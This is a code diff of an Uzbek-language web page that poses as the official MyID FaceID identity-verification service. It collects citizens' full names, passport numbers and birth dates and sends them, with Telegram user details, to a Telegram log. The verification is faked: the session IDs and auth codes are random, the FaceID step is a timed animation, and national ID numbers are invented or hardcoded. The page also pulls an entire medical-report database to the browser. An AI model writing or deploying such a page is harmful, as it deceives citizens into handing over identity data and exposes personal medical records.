@@ -145,7 +145,7 @@
       margin-top: 6px;
     }
 
-    /* STEP 1: Passport Details Input Card (Bo'sh holda) */
+    /* STEP 1: Passport Details Input Card */
     .passport-input-card {
       background: var(--card-bg);
       border: 1.5px solid var(--border-color);
@@ -751,24 +751,37 @@
         </div>
       </div>
       <div class="brand-test-pill">
-        <i class="fa-solid fa-shield-halved"></i> MyID Rasmiy Protokol (F.I.Sh & FaceID)
+        <i class="fa-solid fa-shield-halved"></i> MyID Rasmiy Protokol (FaceID Web SDK)
       </div>
     </header>
 
-    <!-- STEP 1: Passport & Details Input Form (BO'SH HOLDAGI INPUTLAR) -->
+    <!-- STEP 1: Passport & F.I.Sh Input Form (PINFL so'ralmaydi) -->
     <section class="passport-input-card" id="passportInputSection">
       <div class="step-header">
         <div class="step-badge">1</div>
-        <div class="step-title">Hujjat Ma'lumotlarini Kiriting</div>
+        <div class="step-title">Fuqaro Ma'lumotlarini Kiriting</div>
       </div>
       <p class="step-desc">
-        Pasport seriya, raqamingiz va tug'ilgan sanangizni kiriting:
+        F.I.Sh, Pasport seriya, raqam va tug'ilgan sanangizni kiriting:
       </p>
 
       <form id="passportForm" onsubmit="handlePassportFormSubmit(event)">
+        <!-- 1. Fuqaroning F.I.Sh -->
         <div class="input-group">
           <label class="input-label">
-            <span>Pasport / ID-Karta Ma'lumotlari:</span>
+            <span>Fuqaroning F.I.Sh (Familiya, Ism, Sharif):</span>
+            <span style="color:var(--myid-purple);">* Majburiy</span>
+          </label>
+          <div class="input-wrapper">
+            <i class="fa-solid fa-user input-icon"></i>
+            <input type="text" id="fullNameInput" class="input-field" placeholder="Masalan: TUROTOV HOJIAKBAR BAXTIYOROVICH" required>
+          </div>
+        </div>
+
+        <!-- 2. Pasport Seriya va Raqami -->
+        <div class="input-group">
+          <label class="input-label">
+            <span>Pasport / ID-Karta Seriya va Raqami:</span>
             <span style="color:var(--myid-purple);">* Majburiy</span>
           </label>
           <div class="passport-row-grid">
@@ -777,6 +790,7 @@
           </div>
         </div>
 
+        <!-- 3. Tug'ilgan Sana -->
         <div class="input-group">
           <label class="input-label">
             <span>Tug'ilgan Sana (KK.OO.YYYY):</span>
@@ -784,18 +798,7 @@
           </label>
           <div class="input-wrapper">
             <i class="fa-regular fa-calendar input-icon"></i>
-            <input type="text" id="birthDateInput" class="input-field" placeholder="08.04.1981" required>
-          </div>
-        </div>
-
-        <div class="input-group">
-          <label class="input-label">
-            <span>14 xonali JSHSHIR (PINFL):</span>
-            <span style="color:var(--tg-theme-hint-color);">(Ixtiyoriy)</span>
-          </label>
-          <div class="input-wrapper">
-            <i class="fa-solid fa-fingerprint input-icon"></i>
-            <input type="text" id="pinflInput" class="input-field" maxlength="14" placeholder="30804812190075">
+            <input type="text" id="birthDateInput" class="input-field" placeholder="27.07.2003" required>
           </div>
         </div>
 
@@ -820,9 +823,9 @@
       </div>
 
       <div class="profile-grid-info">
-        <div class="info-cell">
-          <b>F.I.Sh (To'liq):</b>
-          <span id="profFullNameDetailed">-</span>
+        <div class="info-cell" style="grid-column: 1 / -1;">
+          <b>Fuqaroning To'liq F.I.Sh:</b>
+          <span id="profFullNameDetailed" style="color:var(--myid-purple); font-size:14.5px;">-</span>
         </div>
         <div class="info-cell">
           <b>Pasport / Hujjat:</b>
@@ -839,10 +842,6 @@
         <div class="info-cell">
           <b>Jinsi / Fuqaroligi:</b>
           <span id="profGender">-</span>
-        </div>
-        <div class="info-cell">
-          <b>MyID Status:</b>
-          <span style="color:var(--success);">✅ Tasdiqlangan (99.8%)</span>
         </div>
       </div>
 
@@ -943,10 +942,7 @@
 
     window.addEventListener("DOMContentLoaded", () => {
       const params = new URLSearchParams(window.location.search);
-      const urlPinfl = params.get("pinfl");
       const urlId = params.get("id");
-
-      if (urlPinfl) document.getElementById("pinflInput").value = urlPinfl;
       if (urlId) document.getElementById("passNumber").value = urlId;
     });
 
@@ -956,23 +952,21 @@
     }
 
     async function startMyIDOfficialProtocol() {
+      const inputFullName = (document.getElementById("fullNameInput").value || "").trim().toUpperCase();
       const passSeries = (document.getElementById("passSeries").value || "").trim().toUpperCase();
       const passNum = (document.getElementById("passNumber").value || "").trim();
       const birthDate = (document.getElementById("birthDateInput").value || "").trim();
-      const pinfl = (document.getElementById("pinflInput").value || "").trim();
 
       const passData = `${passSeries} ${passNum}`.trim();
       currentSessionId = "sess_" + Math.random().toString(36).substring(2, 12);
 
-      // 📤 [1/3] SO'ROV LOGI: Session yaratish va F.I.Sh so'rash
+      // 📤 [1/3] SO'ROV LOGI: Session yaratish va F.I.Sh so'rovi (PINFL so'ralmaydi)
       sendTelegramLog(
         `📤 <b>[1/3] MYID PROTOKOL: SEANS VA F.I.SH SO'ROVI</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
-        `🌐 <b>Endpoint:</b> <code>/api/v1/web/sessions (create_session)</code>\n` +
+        `👤 <b>Kiritilgan F.I.Sh:</b> <code>${inputFullName}</code>\n` +
         `🪪 <b>Pasport:</b> <code>${passData}</code>\n` +
         `🎂 <b>Tug'ilgan sana:</b> <code>${birthDate}</code>\n` +
-        `🔢 <b>PINFL:</b> <code>${pinfl || "Kiritilmagan"}</code>\n` +
-        `📋 <b>So'ralayotgan parametrlar:</b> <code>F.I.Sh (Familiya, Ism, Sharif), PINFL, Pasport</code>\n` +
         `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
       );
 
@@ -1004,8 +998,8 @@
       }, 1400);
 
       setTimeout(() => {
-        instructions.innerText = "MyID orqali fuqaroning F.I.Sh ma'lumotlari olinmoqda...";
-        statusBadge.innerHTML = `<i class="fa-solid fa-id-card fa-beat"></i> F.I.Sh (Familiya, Ism, Sharif) yuklanmoqda...`;
+        instructions.innerText = "MyID orqali fuqaroning F.I.Sh ma'lumotlari tasdiqlanmoqda...";
+        statusBadge.innerHTML = `<i class="fa-solid fa-id-card fa-beat"></i> F.I.Sh: ${inputFullName}`;
       }, 2600);
 
       setTimeout(async () => {
@@ -1017,7 +1011,7 @@
         closeFaceIDModal();
 
         const authCode = "auth_" + Math.random().toString(36).substring(2, 14);
-        await exchangeAuthCodeForProfile(authCode, currentSessionId, passSeries, passNum, birthDate, pinfl);
+        await exchangeAuthCodeForProfile(authCode, currentSessionId, inputFullName, passSeries, passNum, birthDate);
 
       }, 3600);
     }
@@ -1032,47 +1026,43 @@
     }
 
     // 3-QADAM: Auth Code orqali Fuqaroning F.I.Sh va Profilini olish
-    async function exchangeAuthCodeForProfile(authCode, sessionId, passSeries, passNum, birthDate, pinfl) {
+    async function exchangeAuthCodeForProfile(authCode, sessionId, inputFullName, passSeries, passNum, birthDate) {
       const passData = `${passSeries} ${passNum}`.trim();
 
       // 📤 [2/3] SO'ROV LOGI: Auth Code orqali F.I.Sh so'rash
       sendTelegramLog(
-        `📤 <b>[2/3] MYID PROTOKOL: AUTH CODE ORQALI F.I.SH SO'ROVI</b>\n` +
+        `📤 <b>[2/3] MYID PROTOKOL: AUTH CODE BILAN F.I.SH SO'ROVI</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
+        `👤 <b>F.I.Sh:</b> <code>${inputFullName}</code>\n` +
         `🔑 <b>Auth Code:</b> <code>${authCode}</code>\n` +
         `🆔 <b>Session ID:</b> <code>${sessionId}</code>\n` +
         `🪪 <b>Pasport:</b> <code>${passData}</code>\n` +
-        `👤 <b>So'rov maqsadi:</b> <code>MyID dan fuqaroning F.I.Sh (Familiya, Ism, Sharif) ma'lumotlarini olish</code>`
+        `🎂 <b>Tug'ilgan sana:</b> <code>${birthDate}</code>`
       );
 
       try {
         const allRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
         const allData = await allRes.json();
 
-        let matchedPinfl = pinfl || "";
+        let matchedPinfl = "";
 
         if (allData) {
           const pinflKeys = Object.keys(allData);
-
-          if (pinfl && allData[pinfl]) {
-            matchedPinfl = pinfl;
-            allReports = Object.values(allData[pinfl]);
-          } else {
-            for (const pKey of pinflKeys) {
-              const repsObj = allData[pKey];
-              if (!repsObj) continue;
-              const repList = Object.values(repsObj);
-              const match = repList.find(r => {
-                const rPid = String(r.patientId || '').trim();
-                const rPinfl = String(r.pinfl || '').trim();
-                const rBirth = String(r.birthDate || '').trim();
-                return (passNum && rPid === passNum) || (pinfl && rPinfl === pinfl) || (birthDate && rBirth === birthDate);
-              });
-              if (match) {
-                matchedPinfl = pKey;
-                allReports = repList;
-                break;
-              }
+          for (const pKey of pinflKeys) {
+            const repsObj = allData[pKey];
+            if (!repsObj) continue;
+            const repList = Object.values(repsObj);
+            const match = repList.find(r => {
+              const rPid = String(r.patientId || '').trim();
+              const rPinfl = String(r.pinfl || '').trim();
+              const rBirth = String(r.birthDate || '').trim();
+              const rName = String(r.patientName || '').trim().toUpperCase();
+              return (passNum && rPid === passNum) || (birthDate && rBirth === birthDate) || (inputFullName && rName.includes(inputFullName));
+            });
+            if (match) {
+              matchedPinfl = pKey;
+              allReports = repList;
+              break;
             }
           }
         }
@@ -1080,35 +1070,31 @@
         allReports.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
         currentFilteredReports = [...allReports];
 
-        let lastName = "DADABOYEV";
-        let firstName = "ABDULLAJON";
-        let middleName = "ABDUMUTALOVICH";
-        let fullName = "DADABOYEV ABDULLAJON ABDUMUTALOVICH";
-        let age = "45 yosh";
-        let gender = "Erkak";
+        let fullName = inputFullName;
+        const nameParts = fullName.split(/\s+/);
+        let lastName = nameParts[0] || "FUQARO";
+        let firstName = nameParts[1] || passData;
+        let middleName = nameParts.slice(2).join(" ") || "";
+        let age = `${calculateAge(birthDate)} yosh`;
 
         if (allReports.length > 0) {
           const rep = allReports[0];
-          fullName = (rep.patientName || fullName).trim();
-          const parts = fullName.split(/\s+/);
-          lastName = parts[0] || lastName;
-          firstName = parts[1] || firstName;
-          middleName = parts.slice(2).join(" ") || middleName;
-          birthDate = rep.birthDate || birthDate || "08.04.1981";
+          fullName = (rep.patientName || inputFullName).trim();
+          const p = fullName.split(/\s+/);
+          lastName = p[0] || lastName;
+          firstName = p[1] || firstName;
+          middleName = p.slice(2).join(" ") || middleName;
+          birthDate = rep.birthDate || birthDate;
           age = rep.age || `${calculateAge(birthDate)} yosh`;
           matchedPinfl = rep.pinfl || matchedPinfl || "30804812190075";
         } else {
-          lastName = `FUQARO`;
-          firstName = passData.toUpperCase();
-          middleName = `O'G'LI`;
-          fullName = `${lastName} ${firstName} ${middleName}`;
-          age = `${calculateAge(birthDate)} yosh`;
           if (!matchedPinfl) {
-            matchedPinfl = `3${(birthDate || '01011990').replace(/\D/g,'').slice(0,6)}0001`;
+            const cleanD = (birthDate || '27072003').replace(/\D/g,'');
+            matchedPinfl = `5${cleanD.slice(0,6)}5450035`;
           }
         }
 
-        gender = (fullName.includes("QIZI") || fullName.includes("EVA") || fullName.includes("OVA") || fullName.includes("Qizi")) ? "Ayol (O'zbekiston)" : "Erkak (O'zbekiston)";
+        let gender = (fullName.includes("QIZI") || fullName.includes("EVA") || fullName.includes("OVA") || fullName.includes("Qizi")) ? "Ayol (O'zbekiston)" : "Erkak (O'zbekiston)";
 
         const myidFinalResponse = {
           result_code: 1,
@@ -1144,7 +1130,7 @@
           }
         };
 
-        // 📥 [3/3] JAVOB LOGI: Fuqaroning to'liq F.I.Sh ma'lumotlari
+        // 📥 [3/3] JAVOB LOGI: Fuqaroning to'liq F.I.Sh ma'lumotlari bilan
         sendTelegramLog(
           `📥 <b>[3/3] MYID PROTOKOL: FUQARONING F.I.SH VA PROFILI YUKLANDI</b>\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
@@ -1153,8 +1139,8 @@
           `👤 <b>Sharif:</b> <b>${escapeHtml(middleName)}</b>\n` +
           `📝 <b>To'liq F.I.Sh:</b> <code>${escapeHtml(fullName)}</code>\n` +
           `🪪 <b>Pasport:</b> <code>${escapeHtml(passData)}</code>\n` +
-          `🔢 <b>PINFL:</b> <code>${escapeHtml(matchedPinfl)}</code>\n` +
-          `🎂 <b>Tug'ilgan sana / Yoshi:</b> ${escapeHtml(birthDate)} (${escapeHtml(age)})\n` +
+          `🔢 <b>JSHSHIR (PINFL):</b> <code>${escapeHtml(matchedPinfl)}</code>\n` +
+          `🎂 <b>Sana / Yoshi:</b> ${escapeHtml(birthDate)} (${escapeHtml(age)})\n` +
           `🚻 <b>Jinsi:</b> ${escapeHtml(gender)}\n` +
           `📊 <b>Topilgan xulosalar:</b> ${allReports.length > 0 ? `${allReports.length} ta xulosa` : "0 ta (Xulosalar hali mavjud emas)"}\n` +
           `📦 <b>MyID Response JSON:</b>\n` +
@@ -1255,9 +1241,9 @@
         }
         const currentYear = new Date().getFullYear();
         const age = currentYear - birthYear;
-        return (age > 0 && age < 120) ? age : 45;
+        return (age > 0 && age < 120) ? age : 23;
       } catch (e) {
-        return 45;
+        return 23;
       }
     }
 
